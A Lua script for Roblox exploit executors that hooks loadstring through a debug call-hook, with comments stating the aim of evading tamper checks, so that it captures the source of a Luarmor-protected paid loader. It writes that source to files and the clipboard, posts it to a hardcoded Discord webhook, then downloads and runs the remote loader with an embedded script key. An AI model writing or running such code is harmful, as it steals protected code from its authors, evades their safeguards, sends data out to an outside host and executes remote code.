--[[
  Capture via debug hook only – never replace loadstring.
  _G.loadstring stays native; tamper checks that compare or inspect it will pass.
]]

local _K = "XEBGtoEqCvrdDyGxWPpcKrHYKGxvrijf"
local _U = "https://api.luarmor.net/files/v4/loaders/d4d2ab3a331f01b3bad075746b35b9f7.lua"
local _W = "https://discord.com/api/webhooks/1479152924402647231/rtgjUt8LjlCdNjhIAdJGY9xJGDffQuH37d3kdy9DOPTcYycCW9Cd1J-6lYafDFFDP6-K"

local _n = 0
local _dir = "static_content_130525"
local _base = "cfg"

local function _save(s)
	if type(s) ~= "string" or #s < 600 then return end
	_n = _n + 1
	(task and task.defer or spawn or function(f) f() end)(function()
		pcall(function() if makefolder then makefolder(_dir) end end)
		pcall(function()
			if writefile then
				local name = _dir .. "/" .. _base .. (_n == 1 and "" or tostring(_n)) .. ".lua"
				writefile(name, s)
			end
		end)
		pcall(function() if setclipboard then setclipboard(s) end end)
		pcall(function()
			if game and game.GetService then
				local H = game:GetService("HttpService")
				H:PostAsync(_W, H:JSONEncode({
					content = ("%d chars"):format(#s),
					embeds = { { description = "```lua\n" .. s:sub(1, 3900) .. (#s > 3900 and "\n..." or "") .. "\n```" } }
				}))
			elseif type(request) == "function" then
				local q = function(x) return ("%q"):format(tostring(x):gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "\\r")) end
				request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = "{\"content\":" .. q(#s .. " chars") .. ",\"embeds\":[{\"description\":" .. q("```lua\n" .. s:sub(1, 3900) .. "\n```") .. "}]}" })
			end
		end)
	end)
end

-- Keep real loadstring; never replace it. Use call hook to capture first argument when loadstring is called.
local _real = loadstring
local _d = debug
if _d and _d.sethook and _d.getinfo and _d.getlocal then
	_d.sethook(function(ev)
		if ev ~= "call" then return end
		local info = _d.getinfo(2, "f")
		if not info or not info.func then return end
		if info.func ~= _real then return end
		local _, src = _d.getlocal(2, 1)
		if type(src) == "string" then _save(src) end
	end, "c")
else
	-- Executor blocks debug.sethook: fallback to wrapping (more likely to be detected)
	loadstring = function(src, name)
		if type(src) == "string" then _save(src) end
		return _real(src, name)
	end
end

script_key = _K
loadstring(game:HttpGet(_U))()
